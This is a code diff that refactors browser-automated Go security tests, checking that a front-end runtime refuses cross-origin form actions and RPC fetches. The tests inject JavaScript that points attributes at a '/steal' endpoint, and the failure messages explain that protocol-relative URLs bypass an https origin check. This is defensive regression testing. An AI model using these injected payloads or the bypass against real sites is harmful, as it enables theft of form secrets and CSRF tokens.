@@ -156,30 +156,42 @@ func TestBehaviorAttrRejectsForeignSrc(t *testing.T) {
 // `http` nor `https`, so it fell through to the fetch path and the form
 // body was posted cross-origin (stopped only by CSP connect-src).
 func TestFormActionRejectsProtocolRelative(t *testing.T) {
-	g := startGadgetServer(t, `[]`, `
+	// The action points back at this server so a hit proves the guard
+	// let it through, rather than proving an unreachable host failed.
+	// localhost and 127.0.0.1 are different ORIGINS to the browser
+	// but the same server here, so a hit is unambiguous evidence
+	// that the guard let a cross-origin action through.
+	assertGadgetEvilFetchNotHit(t,
+		`
 <form id="f" enctype="application/json" method="post">
   <input name="secret" value="s3cret">
   <button id="go" type="submit">go</button>
-</form>`)
+</form>`,
+		`document.getElementById('f').setAttribute('action','//localhost:'+location.port+'/steal'); true`,
+		`#go`,
+		`SECURITY: [exfil] a protocol-relative form action was fetched by the SPA interceptor (%d hits). Attack: //host/path defeats a /^https?:\/\// origin check`)
+}
+
+// assertGadgetEvilFetchNotHit drives a gadget-server fixture: after
+// evalJS runs and clickSel is clicked, the /steal sink must have zero
+// hits. evalJS retargets an attribute at localhost:<port> — the same
+// server under a different browser origin.
+func assertGadgetEvilFetchNotHit(t *testing.T, bodyHTML, evalJS, clickSel, failFormat string) {
+	t.Helper()
+	g := startGadgetServer(t, `[]`, bodyHTML)
 
 	ctx := chromedptest.Context(t, chromedptest.Timeout(90*time.Second))
-	// The action points back at this server so a hit proves the guard
-	// let it through, rather than proving an unreachable host failed.
 	if err := chromedp.Run(ctx,
 		chromedp.Navigate(g.Srv.URL+"/"),
 		chromedp.WaitVisible(`#ready`, chromedp.ByID),
-		// localhost and 127.0.0.1 are different ORIGINS to the browser
-		// but the same server here, so a hit is unambiguous evidence
-		// that the guard let a cross-origin action through.
-		chromedp.Evaluate(`document.getElementById('f').setAttribute('action','//localhost:'+location.port+'/steal'); true`, nil),
-		chromedp.Click(`#go`, chromedp.ByID),
+		chromedp.Evaluate(evalJS, nil),
+		chromedp.Click(clickSel, chromedp.ByID),
 		chromedp.Sleep(400*time.Millisecond),
 	); err != nil {
 		t.Fatal(err)
 	}
-	if g.EvilFetch.Load() > 0 {
-		t.Errorf(`SECURITY: [exfil] a protocol-relative form action was fetched by the SPA interceptor (%d hits). Attack: //host/path defeats a /^https?:\/\// origin check`,
-			g.EvilFetch.Load())
+	if h := g.EvilFetch.Load(); h > 0 {
+		t.Errorf(failFormat, h)
 	}
 }
 
@@ -193,24 +205,14 @@ func TestFormActionRejectsProtocolRelative(t *testing.T) {
 // class as real for data-kiln-tool (gated behind _kilnOK); the same
 // reasoning was never applied to the other fetch sites.
 func TestRuntimeFetchRefusesForeignOrigin(t *testing.T) {
-	g := startGadgetServer(t, `[]`, `
-<button id="rpc" data-cui-rpc="/placeholder" data-cui-rpc-method="POST">go</button>`)
-
-	ctx := chromedptest.Context(t, chromedptest.Timeout(90*time.Second))
-	if err := chromedp.Run(ctx,
-		chromedp.Navigate(g.Srv.URL+"/"),
-		chromedp.WaitVisible(`#ready`, chromedp.ByID),
-		// localhost and 127.0.0.1 are different origins to the browser
-		// but the same server here, so a hit is unambiguous evidence.
-		chromedp.Evaluate(`document.getElementById('rpc').setAttribute('data-cui-rpc','http://localhost:'+location.port+'/steal'); true`, nil),
-		chromedp.Click(`#rpc`, chromedp.ByID),
-		chromedp.Sleep(400*time.Millisecond),
-	); err != nil {
-		t.Fatal(err)
-	}
-	if g.EvilFetch.Load() > 0 {
-		t.Errorf("SECURITY: [csrf] data-cui-rpc fetched a foreign origin (%d hits) and forwarded the CSRF token with it", g.EvilFetch.Load())
-	}
+	// localhost and 127.0.0.1 are different origins to the browser
+	// but the same server here, so a hit is unambiguous evidence.
+	assertGadgetEvilFetchNotHit(t,
+		`
+<button id="rpc" data-cui-rpc="/placeholder" data-cui-rpc-method="POST">go</button>`,
+		`document.getElementById('rpc').setAttribute('data-cui-rpc','http://localhost:'+location.port+'/steal'); true`,
+		`#rpc`,
+		"SECURITY: [csrf] data-cui-rpc fetched a foreign origin (%d hits) and forwarded the CSRF token with it")
 }
 
 // TestSetSignalRejectsProtoKey pins that a DOM-attribute-controlled
